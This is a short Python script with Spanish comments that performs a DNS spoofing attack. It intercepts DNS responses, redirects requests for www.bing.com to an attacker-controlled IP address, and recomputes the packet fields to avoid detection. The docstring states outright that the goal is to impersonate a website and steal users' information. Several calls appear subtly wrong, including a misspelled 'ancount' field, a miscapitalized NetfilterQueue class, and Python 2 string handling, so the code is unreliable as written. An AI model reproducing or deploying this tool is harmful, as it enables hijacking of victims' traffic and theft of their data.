#!/usr/bin/env python3

"""DNS Spoof
Suplantaremos una página web que un usuario quiera acceder
haciándonos pasar por ella, permitiéndonos robarle información
"""

import netfilterqueue
import scapy.all as scapy


def catch_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        #  modificamos la respuesta
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.6")  # rdata=mi ip
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].acount = 1
            #  Borramos los indices que nos podrían delatar
            #  los checksum y longitud de IP y UDP
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            #  Guardamos el paquete con la nueva peptición
            packet.set_payload(str(scapy_packet))

        # fin modificacion
            print(scapy_packet.show())
    packet.accept()


queue = netfilterqueue.Netfilterqueue()
queue.bind(0, catch_packet)
queue.run()
